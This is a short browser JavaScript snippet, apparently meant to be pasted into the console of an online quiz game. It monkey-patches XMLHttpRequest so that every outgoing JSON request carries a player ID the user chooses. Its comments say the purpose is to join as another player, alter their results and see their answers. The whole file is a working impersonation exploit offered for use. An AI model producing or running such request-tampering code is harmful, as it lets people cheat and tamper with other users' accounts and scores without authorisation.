// The purpose of this script is joining the game as someone else without duplicated name popup.
// This can also change someone else result, and view their answer.
;(() => {
  const original_xhr = window.XMLHttpRequest;

  // https://stackoverflow.com/questions/9804777/how-to-test-if-a-string-is-json-or-not
  const isJSON = (item) => {
    let value = typeof item !== "string" ? JSON.stringify(item) : item;
    try {
      value = JSON.parse(value);
    } catch (e) {
      return false;
    }

    return typeof value === "object" && value !== null;
  }

  // Prompt
  const fakePlayerId = prompt("Enter playerId/playerName to join, or fake login as someone else.")

  // Tamper xhr send body
  class injected_xhr extends original_xhr {
    /* For debugging, we don't need this
    open(method, url) {
      // Debug url
      console.log(url);
      return super.open(method, url);
    }
    */
    send(body) {
      // Debug body
      console.log(body);

      // Check is json
      let tampered_body = body;
      if (isJSON(body)) {
        const r_body = JSON.parse(body);
        
        // Find "playerId"
        if (r_body && r_body["playerId"]) {
          // Tamper "playerId"
          r_body["playerId"] = fakePlayerId;
        }

        // Change tampered_body
        tampered_body = JSON.stringify(r_body);
      }
      
      // Send request
      return super.send(tampered_body);
    }
  }

  // Inject xhr
  window.XMLHttpRequest = injected_xhr;
})();